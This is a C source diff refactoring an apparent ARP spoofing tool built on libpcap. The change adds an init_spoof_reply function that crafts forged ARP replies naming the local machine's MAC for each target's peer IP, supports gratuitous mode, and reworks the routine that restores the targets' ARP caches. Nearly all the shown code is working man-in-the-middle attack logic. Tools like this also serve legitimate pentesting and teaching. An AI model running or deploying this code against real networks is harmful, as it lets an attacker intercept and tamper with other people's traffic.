@@ -8,23 +8,23 @@
 
 static bool       spoof_running = false;
 static pcap_t    *pcap_handle;
-static Host       local;
+static Host       local_host;
 static Host       targets[TARGETS];
 static ARPPacket  packets[TARGETS];
 static uint8_t    packet_buffer[TARGETS][PACKET_LEN];
 
 
-static void write_packet      (ARPPacket *p, uint8_t *b, bool gratuitous);
+static void write_packet      (ARPPacket *p, uint8_t *b);
 static void respoof           (u_char *u, const struct pcap_pkthdr *h, const u_char *p);
-static void init_packets      (ARPPacket *p1,  ARPPacket *p2, bool gratuitous);
+static void init_spoof_reply  (ARPPacket *pack, Host *target, Host *sender, Host *local, bool grat);
 static void send_spoof_packet (enum target T);
 
 
-static void write_packet(ARPPacket *packet, uint8_t *pbuff, bool gratuitous)
+static void write_packet(ARPPacket *packet, uint8_t *pbuff)
 {
     EthernetHeader eth_h;
-    memcpy(&eth_h.target_addr, packet->arp_des_mac, MAC_SIZE);
-    memcpy(&eth_h.sender_addr, packet->arp_src_mac, MAC_SIZE);
+    memcpy(&eth_h.target_addr, packet->eth_des_mac, MAC_SIZE);
+    memcpy(&eth_h.sender_addr, packet->eth_src_mac, MAC_SIZE);
     eth_h.protocol = htons(ETHER_TYPE_ARP);
 
     ARPHeader arp_h;
@@ -36,11 +36,7 @@ static void write_packet(ARPPacket *packet, uint8_t *pbuff, bool gratuitous)
     memcpy(&arp_h.sender_hardware_addr, packet->arp_src_mac, MAC_SIZE);
     memcpy(&arp_h.sender_protocol_addr, packet->arp_src_ip,  IP_SIZE);
     memcpy(&arp_h.target_hardware_addr, packet->arp_des_mac, MAC_SIZE);
-
-    if (gratuitous)
-        memcpy(&arp_h.target_protocol_addr, packet->arp_src_ip,  IP_SIZE);
-    else
-        memcpy(&arp_h.target_protocol_addr, packet->arp_des_ip,  IP_SIZE);
+    memcpy(&arp_h.target_protocol_addr, packet->arp_des_ip,  IP_SIZE);
 
     // Write headers to buffer
     memcpy(pbuff, &eth_h, ETH_HEADER_LEN);
@@ -77,24 +73,6 @@ static void respoof(__attribute__ ((unused)) u_char *user,
 }
 
 
-static void init_packets(ARPPacket *t1_spoof,  ARPPacket *t2_spoof,  bool grat)
-{
-    t1_spoof->arp_operation = ARPOP_REPLY;
-    memcpy(&(t1_spoof->arp_src_ip), targets[T2].ip, IP_SIZE);
-    memcpy(&(t1_spoof->arp_des_ip), targets[T1].ip, IP_SIZE);
-    memcpy(&(t1_spoof->arp_src_mac), &local.mac, MAC_SIZE);
-    memcpy(&(t1_spoof->arp_des_mac), targets[T1].mac, MAC_SIZE);
-    write_packet(t1_spoof, packet_buffer[T1], grat);
-
-    t2_spoof->arp_operation = ARPOP_REPLY;
-    memcpy(&(t2_spoof->arp_src_ip), targets[T1].ip, IP_SIZE);
-    memcpy(&(t2_spoof->arp_des_ip), targets[T2].ip, IP_SIZE);
-    memcpy(&(t2_spoof->arp_src_mac), &local.mac, MAC_SIZE);
-    memcpy(&(t2_spoof->arp_des_mac), targets[T2].mac, MAC_SIZE);
-    write_packet(t2_spoof, packet_buffer[T2], grat);
-}
-
-
 static void send_spoof_packet(enum target T)
 {
     if (verbose)
@@ -104,38 +82,53 @@ static void send_spoof_packet(enum target T)
 }
 
 
-static void send_unspoofs(void)
+static void init_spoof_reply(ARPPacket *pack, Host *target, Host *sender, Host *local, bool grat)
+{
+    memcpy(&(pack->eth_src_mac), local->mac, MAC_SIZE);
+    memcpy(&(pack->eth_des_mac), target->mac, MAC_SIZE);
+
+    pack->arp_operation = ARPOP_REPLY;
+    memcpy(&(pack->arp_src_ip), sender->ip, IP_SIZE);
+
+    if (grat)
+        memcpy(&(pack->arp_des_ip), sender->ip, IP_SIZE);
+    else
+        memcpy(&(pack->arp_des_ip), target->ip, IP_SIZE);
+
+    memcpy(&(pack->arp_src_mac), local->mac, MAC_SIZE);
+    memcpy(&(pack->arp_des_mac), target->mac, MAC_SIZE);
+}
+
+
+static void send_reply_unspoofs(void)
 {
     uint8_t   buff[PACKET_LEN];
     ARPPacket pack;
 
-    memcpy(&pack.arp_des_ip, targets[T2].ip, IP_SIZE);
-    memcpy(&pack.arp_des_mac, targets[T2].mac, MAC_SIZE);
-    memcpy(&pack.arp_src_ip, targets[T1].ip, IP_SIZE);
-    memcpy(&pack.arp_src_mac, targets[T1].mac, MAC_SIZE);
-
-    write_packet(&pack, buff, true);
+    init_spoof_reply(&pack, &targets[T1], &targets[T2], &targets[T2], true);
+    write_packet(&pack, buff);
     pcap_inject(pcap_handle, (uint8_t*) &buff, PACKET_LEN);
 
     memset(&pack, 0, sizeof(ARPPacket));
 
-    memcpy(&pack.arp_des_ip, targets[T1].ip, IP_SIZE);
-    memcpy(&pack.arp_des_mac, targets[T1].mac, MAC_SIZE);
-    memcpy(&pack.arp_src_ip, targets[T2].ip, IP_SIZE);
-    memcpy(&pack.arp_src_mac, targets[T2].mac, MAC_SIZE);
-
-    write_packet(&pack, buff, true);
+    init_spoof_reply(&pack, &targets[T2], &targets[T1], &targets[T1], true);
+    write_packet(&pack, buff);
     pcap_inject(pcap_handle, (uint8_t*) &buff, PACKET_LEN);
 }
 
 
-void reply_spoof_init(pcap_t *pcap_h, Host t[TARGETS], Host *l, bool grat)
+void reply_spoof_init(pcap_t *pcap_h, Host t[TARGETS], Host *local, bool grat)
 {
     pcap_handle = pcap_h;
 
     memcpy(&targets, t, sizeof(Host) * TARGETS);
-    memcpy(&local, l, sizeof(Host));
-    init_packets(&packets[T1], &packets[T2], grat);
+    memcpy(&local_host, local, sizeof(Host));
+
+    init_spoof_reply(&packets[T1], &targets[T1], &targets[T2], &local_host, grat);
+    write_packet(&packets[T1], packet_buffer[T1]);
+
+    init_spoof_reply(&packets[T2], &targets[T2], &targets[T1], &local_host, grat);
+    write_packet(&packets[T2], packet_buffer[T2]);
 }
 
 
@@ -154,7 +147,7 @@ void reply_spoof_stop(void)
         return;
 
     if (unspoof)
-        send_unspoofs();
+        send_reply_unspoofs();
 
     pcap_breakloop(pcap_handle);
 }
